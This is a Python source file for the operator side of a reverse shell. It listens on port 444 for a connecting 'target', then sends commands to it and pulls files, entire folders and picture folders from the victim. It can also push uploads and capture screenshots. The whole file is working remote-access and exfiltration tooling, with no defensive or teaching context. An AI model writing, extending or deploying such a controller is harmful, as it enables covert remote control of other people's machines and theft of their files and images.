
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import json
import base64
import os
import winsound

count = 1

def reliable_send(data):
		data1 = data.decode('cp862',errors='replace')
		json_data = json.dumps(data1)
		target.send(json_data.encode())

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(4096)
			return json.loads(json_data)
		except ValueError:
			continue

def shell():
	global count
	while True:
		command = raw_input("* Shell#~%s: " % str(ip))
		reliable_send(command)
		if command == "q":
			break
		elif command[:2] == "cd" and len(command[3:]) > 1:
			print(reliable_recv())



		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				print('Loading...')
				result = reliable_recv()
				print('done recv')
				if result == 'DownloadError!':
					print(result)
				else:
					file.write(base64.b64decode(result))


		elif command[:3] == "lcd":
			try:
				os.chdir(command[4:])
				print(os.getcwd())
			except:
				print(os.getcwd())



		elif command[:6] == "folder":
			try:
				os.mkdir(command[7:])
				os.chdir(command[7:])
				print('Folder Created')
			except:
				print('Folder Exsist')
				os.chdir(command[7:])
			t = reliable_recv()
			z = 0
			while True:
				name = reliable_recv()
				path = os.getcwd()
				if name in os.listdir(path):
					reliable_send('skip')
					print('skipped')
					z += 1
				else:
					print(name)
					if name == 'done':
						winsound.MessageBeep()
						break
					else:	
						print("%s/" % int(z) + "%s" % int(t))
						z += 1
						reliable_send('gotname')
						with open(name, "wb") as file:
							print('loading...')
							result = reliable_recv()
							if result == 'DownloadError!':
								print(result)
							else:
								file.write(base64.b64decode(result))
								reliable_send('gotall')
					print('done')
					



		elif command[:4] == "pics":
			try:
				os.mkdir(command[5:])
				os.chdir(command[5:])
				print('Folder Created')
			except:
				print('Folder Exsist')
				os.chdir(command[5:])
			t = reliable_recv()
			z = 0
			while True:
				name = reliable_recv()
				path = os.getcwd()
				if name in os.listdir(path):
					reliable_send('skip')
					print('skipped')
					z += 1
				else:
					print(name)
					if name == 'done':
						winsound.MessageBeep()
						break
					else:	
						print("%s/" % int(z) + "%s" % int(t))
						z += 1
						reliable_send('gotname')
						with open(name, "wb") as file:
							print('loading...')
							result = reliable_recv()
							if result == 'DownloadError!':
								print(result)
							else:
								file.write(base64.b64decode(result))
								reliable_send('gotall')
					print('done')
					
			 

		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin:
					x = base64.b64encode(fin.read()).decode()
					reliable_send(x)
					print('Loading...')
					print(reliable_recv())
			except:
				failed = "Fail to Upload"
				print(failed)
				reliable_send(base64.b64encode(failed))



		elif command[:11] == "screenshoot":
			try:
				with open("screenshot%d.png" % count, "wb") as screen:
					print('Loading...')
					image = reliable_recv()
					image_decoded = base64.b64decode(image)
					if image[:4] == "[!!]":
						print(image)
					else:
						screen.write(image_decoded)
						count += 1

			except: 
				print('Error')

		elif command[:4] == "list":
			try: 
				result = reliable_recv()
				for i in result:
					print(i)
			except:
				print('Command Error!')


		else:
			try: 
				result = reliable_recv()
				print(result)
			except:
				print('Command Error!')

def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("0.0.0.0",444))
	s.listen(5)
	print("Listening for Incoming connecions")
	target, ip = s.accept()
	print("Target Connected")
	duration = 1000  # milliseconds
	freq = 440  # Hz
	winsound.Beep(freq, duration)
	
server()
shell()
print('closeconnection')
s.close()

